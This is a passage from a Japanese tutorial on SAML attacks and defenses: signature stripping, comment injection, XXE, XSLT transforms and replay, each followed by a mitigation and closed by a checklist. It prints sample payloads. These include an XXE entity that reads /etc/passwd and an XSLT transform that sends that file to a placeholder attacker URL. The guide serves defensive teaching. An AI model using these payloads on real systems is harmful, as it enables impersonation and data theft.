見ての通り、この`<saml2:Assertion>`には`<ds:Signature>`要素が存在しない。`NameID`は単なる文字列`admin`であり、これをそのまま信頼してセッションを発行してしまうSPでは、攻撃者はブラウザの開発者ツールやプロキシツール（Burp Suiteなど）でPOSTボディ中の`SAMLResponse`（Base64エンコードされたXML）をデコードし、このように書き換えたうえで再エンコードして送信するだけで管理者になりすませる。

**防御策:** SP側は「署名が存在しない、または`Issuer`が期待値と異なる、あるいは使用アルゴリズムが弱い」場合は**無条件に拒否**しなければならない。署名検証の要否を設定でOFFにできる実装（デバッグ用の抜け道が本番に残るケース）は特に危険である。

### XMLコメント注入によるパーサー混乱

**仕組み:** XMLパーサーの中には、コメント（`<!-- ... -->`）を含むテキストノードを結合する際に、コメント部分を除去してから前後のテキストを連結してしまう実装がある。一方で、署名対象のダイジェスト計算では正規化（Canonicalization）の仕様上コメントが別ノードとして扱われるため、「署名時に見ていた文字列」と「アプリケーションが最終的に読み取る文字列」がズレる。

```xml
<SAMLResponse>
    <Issuer>https://idp.com/</Issuer>
    <Assertion ID="_id1234">
        <Subject>
            <NameID>user@user.com<!--XMLCOMMENT-->.evil.com</NameID>
```

攻撃者は正規に登録されている`user@user.com`という文字列を`NameID`の先頭に含めつつ、その直後にコメントを挿入して`.evil.com`という文字列を続ける。署名対象としてダイジェストが計算される際には（実装によって）コメント込みの文字列、あるいはコメントを除いた`user@user.com`として扱われる一方、後続のビジネスロジックがテキストノードを単純結合すると`user@user.com.evil.com`という、署名時には存在しなかった文字列がユーザー識別子として使われてしまう。この手口は前述のOneLogin・OmniAuth-SAML・Shibbolethなど複数実装に共通する脆弱性（CVE-2017-11427等）として実際に報告された。

**防御策:** XMLパーサーの設定で、コメントノードを解析前に完全に除去する（strip）か、少なくとも署名検証とビジネスロジックの双方で同一の除去済みDOMを使い回す。

### XML外部エンティティ（XXE）インジェクション

**仕組み:** SAMLレスポンスはXML文書であるため、パーサーがDTD（文書型定義）の外部エンティティ展開を許可している場合、XXE攻撃が成立する。XXEはXMLパーサーが`<!DOCTYPE>`宣言内で定義された「エンティティ（`&name;`のような置換用の変数）」を、外部ファイルや外部URLの内容に展開してしまう脆弱性である。SAML特有の興味深い点は、エンティティ定義自体は**署名対象のダイジェスト計算後にパーサーが展開する**ため、「署名は変更されていないのに、実際に読み取られる値だけがすり替わる」という形で署名検証をすり抜けられることにある。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE Response [
  <!ENTITY s "s">
  <!ENTITY f1 "f1">
]>
<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol"
  Destination="https://idptestbed/Shibboleth.sso/SAML2/POST"
  ID="_04cfe67e596b7449d05755049ba9ec28"
  InResponseTo="_dbbb85ce7ff81905a3a7b4484afb3a4b"
  IssueInstant="2017-12-08T15:15:56.062Z" Version="2.0">
[...]
  <saml2:Attribute FriendlyName="uid"
    Name="urn:oid:0.9.2342.19200300.100.1.1"
    NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
    <saml2:AttributeValue>
      &s;taf&f1;
    </saml2:AttributeValue>
  </saml2:Attribute>
[...]
</saml2p:Response>
```

この例では`&s;`が`"s"`に、`&f1;`が`"f1"`に展開され、最終的な属性値は`staff1`になる。実際の攻撃では、内部エンティティ定義の代わりに**外部エンティティ**（`<!ENTITY xxe SYSTEM "file:///etc/passwd">`のように外部リソースを指すもの）を定義し、その内容をレスポンスの属性値やエラーメッセージ経由で外部に漏洩させる（ファイル読み取り、SSRF、場合によってはDoS）ことが狙われる。

**防御策:** XMLパーサーでDTDの処理自体を無効化する（`disallow-doctype-decl`、あるいは外部エンティティ解決のみを無効化するオプション）。多くの現代的なXMLライブラリはデフォルトで安全側に倒しているが、レガシーなSAML実装や独自パーサーでは依然としてリスクが残る。

### XSLT変換によるコード実行・情報漏洩

**仕組み:** XML署名の仕様（XMLDSig）には、署名対象データに対して`<ds:Transform>`で変換処理を適用できるオプション機能があり、その変換方式の一つとして**XSLT（Extensible Stylesheet Language Transformations）**が許可されている場合がある。XSLTはチューリング完全に近い変換言語であり、`unparsed-text()`のような拡張関数を使うとローカルファイルの読み取りや、`unparsed-text()`に外部URLを渡すことでの外部送信（SSRF/データ持ち出し）が可能になる実装がある。

```xml
<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
  ...
    <ds:Transforms>
      <ds:Transform>
        <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
          <xsl:template match="doc">
            <xsl:variable name="file" select="unparsed-text('/etc/passwd')"/>
            <xsl:variable name="escaped" select="encode-for-uri($file)"/>
            <xsl:variable name="attackerUrl" select="'http://[ATTACKER.DOMAIN.TLD]/'"/>
            <xsl:variable name="exploitUrl" select="concat($attackerUrl,$escaped)"/>
            <xsl:value-of select="unparsed-text($exploitUrl)"/>
          </xsl:template>
        </xsl:stylesheet>
      </ds:Transform>
    </ds:Transforms>
  ...
</ds:Signature>
```

処理の流れとしては、SPが署名検証の一環としてこの変換を実行してしまうと、まず`/etc/passwd`（防御目的の学習用の一般的な例示ファイル）の内容を読み取り、それをURLエンコードして攻撃者サーバーのURLに連結し、`unparsed-text()`で「そのURLへのリクエスト」を発生させることでファイル内容を外部に持ち出す、という多段の悪用が成立する。これは前述のXXEと同様、「署名検証の過程そのものに攻撃者が制御可能な処理を挟み込める」という、SAMLの検証パイプラインが複雑であることに起因する脆弱性である。

**防御策:** 署名検証ライブラリで、変換方式としてXSLTを許可しない設定にする（そもそも標準の署名検証にXSLT変換が必要になる正当なユースケースはSSOにおいてはほぼ存在しない）。多くの現代的なSAML実装ライブラリはXSLT変換をデフォルトで無効化しているが、独自実装やレガシー実装では確認が必要である。

> 出典: PayloadsAllTheThings — SAML Injection — https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SAML%20Injection

### リプレイ攻撃（有効期限検証の欠如）

SAMLアサーションには`<saml2:Conditions NotBefore="..." NotOnOrAfter="...">`という有効期間の指定が含まれる。SPがこの値を検証しない、あるいは一度使用されたアサーションを再利用不可にする仕組み（アサーションIDのワンタイム使用管理）を持たない場合、盗聴・傍受された正規のSAMLレスポンスを攻撃者が何度でも再送し、セッションを乗っ取れる。実例として**CVE-2018-14637**では、SP側が`NotOnOrAfter`を無視する実装バグにより、古いSAML応答が繰り返し受理されてしまう問題が確認された。

**防御策:** `NotBefore`/`NotOnOrAfter`の厳密な検証、アサーションIDの使用済み管理（リプレイキャッシュ）、可能であればSAMLレスポート自体のTTLを短く保つこと。

### エンタープライズ製品での実例（設計脆弱性のインパクトの大きさ）

- **Oracle Access Manager（CVE-2021-35587）**: CVSS 9.8。未認証のリモート攻撃者による完全な乗っ取りが可能とされた。
- **Shibboleth OpenSAML（2023年）のSSRF**: `<KeyInfo>`要素（署名検証に使う鍵情報を指定する要素）を悪用し、SPやIdPに任意の外部URLへのリクエストを強制させるSSRF（Server-Side Request Forgery）。OpenSAML XMLTooling V3.2.4で修正された。DoS誘発や他の攻撃との連鎖に使われる懸念が指摘されている。

> 出典: Security Vulnerabilities in SAML, OAuth 2.0, OpenID Connect, and JWT — https://guptadeepak.com/security-vulnerabilities-in-saml-oauth-2-0-openid-connect-and-jwt/

### 検査・防御に使えるツール

PayloadsAllTheThingsのSAML Injectionページでは、実際の診断（防御目的の自己検証・許可を得たペネトレーションテスト）で使われる代表的なツールが紹介されている。

- **SAMLRaider**: Burp Suite拡張で、SAMLレスポンスのデコード・編集、XSWペイロードの自動生成、証明書のクローン作成などを支援する。
- **XSW（XML Signature Wrapping）Burp拡張**: XSW1〜XSW8のバリエーションを自動的に生成し、対象SPがどのパターンに脆弱かを機械的に確認できる。
- **OWASP ZAP SAML Support アドオン**: ZAPプロキシ上でSAMLメッセージを解析・改ざんするための支援機能。

これらのツールは、防御側の視点では「自組織のSP実装が上記のどのクラスの攻撃に耐性があるか」を、許可された環境下で網羅的に確認するために使うべきものであり、本節の目的もそのための知識整理にある。

### まとめ：SAML防御のチェックリスト

1. 署名検証で使用したノードと、業務ロジックが読み取るノードを**完全に一致**させる（XSW対策の本質）。
2. 署名が存在しない、または`Issuer`・アルゴリズムが期待値と異なるレスポンスは無条件に拒否する（署名除去対策）。
3. XMLパーサーでDTD・外部エンティティ展開を無効化する（XXE対策）。
4. 署名検証パイプラインでXSLT変換を許可しない（XSLT攻撃対策）。
5. コメントノードを解析前に除去するか、署名検証とビジネスロジックで同一の正規化済みDOMを使う（コメント注入対策）。
6. `NotBefore`/`NotOnOrAfter`を厳密に検証し、アサーションIDの再利用を防ぐリプレイキャッシュを持つ（リプレイ対策）。
7. ライブラリは常に最新に保つ。SAML関連の重大CVEは2012年・2017〜2018年・2021年・2023年・2024年と繰り返し発生しており、「枯れた技術だから安全」という思い込みは禁物である。

---

## ナビゲーション

← [第2章 JWT攻撃](02-jwt.md)  ｜  [📚 目次（ホーム）](index.md)  ｜  [第4章 WebAuthn／パスキー（FIDO2）](04-webauthn-passkeys.md) →
